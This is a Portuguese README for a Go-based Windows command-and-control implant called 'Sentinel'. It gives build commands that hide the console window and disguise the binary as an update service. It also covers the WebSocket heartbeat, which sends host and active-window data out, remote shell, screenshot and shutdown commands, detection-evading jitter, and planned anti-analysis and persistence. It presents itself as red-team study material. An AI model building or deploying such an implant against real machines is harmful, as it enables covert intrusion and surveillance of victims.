# Sentinel Implant

**Version:** 1.0.6  
**Language:** Go 1.21+  
**Target:** Windows x64

Agent (implant) do Sentinel C2 Framework. Conecta-se ao Sentinel Core via WebSocket puro para receber comandos e enviar telemetria.

## 🏗️ Arquitetura

```
sentinel-implant/
├── main.go                          # Entry point
├── config/
│   └── config.go                    # Configurações
├── core/
│   ├── connection/
│   │   ├── websocket.go             # Cliente WebSocket + reconexão
│   │   └── message.go               # Structs de mensagens
│   ├── identity/
│   │   └── hwid.go                  # Geração de HWID único
│   └── telemetry/
│       └── collector.go             # Coleta de métricas
├── handlers/
│   ├── registry.go                  # Registry pattern
│   ├── executor/
│   │   └── shell.go                 # SHELL command
│   ├── surveillance/
│   │   ├── screenshot.go            # SCREENSHOT
│   │   └── process.go               # PROCESS_LIST
│   └── troll/
│       ├── message.go               # MESSAGE (MessageBox)
│       ├── url.go                   # OPEN_URL
│       └── system.go                # KILL_PROC, SHUTDOWN
└── stealth/
    ├── environment.go               # Anti-análise (placeholder)
    └── persistence.go               # Persistência (placeholder)
```

## 🚀 Build

### Requisitos

- Go 1.21 ou superior
- Acesso à internet para baixar dependências

### Build via PowerShell (Windows Nativo)

Este é o método recomendado para desenvolvimento em ambiente Windows.

Permissão de Execução:
Talvez seja necessário liberar a execução de scripts no PowerShell:

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

Uso do Script build.ps1:

```
# Build padrão (Console, Localhost)
.\build.ps1

# Build customizado (Debug)
.\build.ps1 -Server "ws://192.168.1.50:8080/ws" -Key "MinhaChaveSecreta"

# Build de Produção (Sem janela de console, URL segura)
.\build.ps1 -Server "wss://[c2.meudominio.com/ws-sentinel](https://c2.meudominio.com/ws-sentinel)" -Key "ProdKey_X92" -Output "update_service.exe" -Gui
```


### Build Básico (Desenvolvimento)

```bash
# Baixar dependências
go mod tidy

# Build para Windows
GOOS=windows GOARCH=amd64 go build -o sentinel-implant.exe .
```

### Build com Script

```bash
chmod +x build.sh

# Build padrão
./build.sh

# Build com configurações customizadas
./build.sh -s "ws://c2.example.com/ws-sentinel" -p "MySecretKey" -o agent.exe

# Build de produção (sem console)
./build.sh -s "wss://c2.example.com/ws-sentinel" -p "ProdKey123" -o update.exe --gui
```

### Build Manual de Produção

```bash
GOOS=windows GOARCH=amd64 go build \
    -ldflags="-s -w -H windowsgui \
        -X 'sentinel-implant/config.serverURL=wss://c2.example.com/ws-sentinel' \
        -X 'sentinel-implant/config.psk=PRODUCTION_SECRET_KEY'" \
    -o agent.exe .
```

### Flags de Build

| Flag | Descrição |
|------|-----------|
| `-s` | Remove symbol table |
| `-w` | Remove DWARF debug info |
| `-H windowsgui` | Remove janela de console |

## ⚙️ Configuração

O agente pode ser configurado de 3 formas (em ordem de prioridade):

1. **Build flags** (`-ldflags`)
2. **Variáveis de ambiente**
3. **Valores padrão**

### Variáveis de Ambiente

```bash
SENTINEL_SERVER=ws://192.168.1.100:8080/ws-sentinel
SENTINEL_PSK=MySecretKey123
SENTINEL_DEBUG=1  # Desativa verificações de ambiente
```

### Valores Padrão

| Configuração | Valor Padrão |
|--------------|--------------|
| ServerURL | `ws://localhost:8080/ws-sentinel` |
| PSK | `SENTINEL_PROJECT_V1_SECRET_KEY` |
| HeartbeatInterval | 5 segundos |
| ReconnectMinDelay | 1 segundo |
| ReconnectMaxDelay | 60 segundos |

## 📡 Protocolo

### Autenticação

Durante o handshake WebSocket, o agente envia:

```
X-Agent-Auth: SHA256(PSK + TIMESTAMP)
X-Agent-Timestamp: UNIX_MILLIS
```

### Mensagens

#### HEARTBEAT (Agent → Server)

Enviado a cada ~5 segundos com telemetria:

```json
{
  "type": "HEARTBEAT",
  "payload": {
    "hwid": "AA-BB-CC-DD-EE-FF",
    "hostname": "DESKTOP-PC01",
    "os_info": "Microsoft Windows 11 Pro (10.0.22631)",
    "ip_local": "192.168.0.105",
    "cpu_load": 12.5,
    "ram_usage": 4096,
    "active_window": "Chrome - Gmail"
  }
}
```

#### COMMAND (Server → Agent)

```json
{
  "type": "COMMAND",
  "payload": {
    "id": "uuid",
    "type": "SHELL",
    "params": ["ipconfig", "/all"]
  }
}
```

#### COMMAND_RESULT (Agent → Server)

```json
{
  "type": "COMMAND_RESULT",
  "payload": {
    "command_id": "uuid",
    "hwid": "AA-BB-CC-DD-EE-FF",
    "status": "SUCCESS",
    "output": "..."
  }
}
```

## 🎮 Comandos Suportados

| Comando | Descrição | Params |
|---------|-----------|--------|
| `SHELL` | Executa comando no shell | `["cmd", "/c", "comando"]` |
| `SCREENSHOT` | Captura a tela | `[]` |
| `PROCESS_LIST` | Lista processos | `[]` |
| `MESSAGE` | Exibe MessageBox | `["Título", "Mensagem"]` |
| `OPEN_URL` | Abre URL no navegador | `["https://..."]` |
| `KILL_PROC` | Mata processo por nome | `["processo.exe"]` |
| `SHUTDOWN` | Desliga o computador | `[]` ou `["force"]` |

## 🔄 Resiliência

O agente implementa:

- **Reconexão automática** com backoff exponencial
- **Jitter** em heartbeats para evitar padrões detectáveis
- **Loop infinito** - nunca encerra, mesmo com erros

### Backoff Exponencial

```
Tentativa 1: 1s
Tentativa 2: 2s
Tentativa 3: 4s
Tentativa 4: 8s
Tentativa 5: 16s
Tentativa 6: 32s
Tentativa 7+: 60s (teto)
```

## 🛡️ Stealth (v2.0)

Estrutura preparada para:

- Detecção de VM (VMware, VirtualBox)
- Detecção de Debugger
- Detecção de Sandbox
- Persistência (Registry, Startup, Tasks)

## 📋 Checklist de Desenvolvimento

### Core
- [x] `config/config.go` - Configurações
- [x] `core/identity/hwid.go` - Geração de HWID
- [x] `core/connection/websocket.go` - Cliente WebSocket
- [x] `core/connection/message.go` - Structs de mensagem
- [x] `core/telemetry/collector.go` - Coleta de métricas

### Handlers
- [x] `handlers/registry.go` - Registry pattern
- [x] `handlers/executor/shell.go` - SHELL
- [x] `handlers/surveillance/screenshot.go` - SCREENSHOT
- [x] `handlers/surveillance/process.go` - PROCESS_LIST
- [x] `handlers/troll/message.go` - MESSAGE
- [x] `handlers/troll/url.go` - OPEN_URL
- [x] `handlers/troll/system.go` - KILL_PROC, SHUTDOWN

### Stealth
- [x] `stealth/environment.go` - Placeholders
- [x] `stealth/persistence.go` - Placeholders

### Main
- [x] `main.go` - Entry point
- [x] `go.mod` - Dependências
- [x] `build.sh` - Script de build

## ⚠️ Aviso Legal

Este projeto é para fins **educacionais** de estudo de segurança ofensiva (Red Teaming). Use apenas em ambientes autorizados.
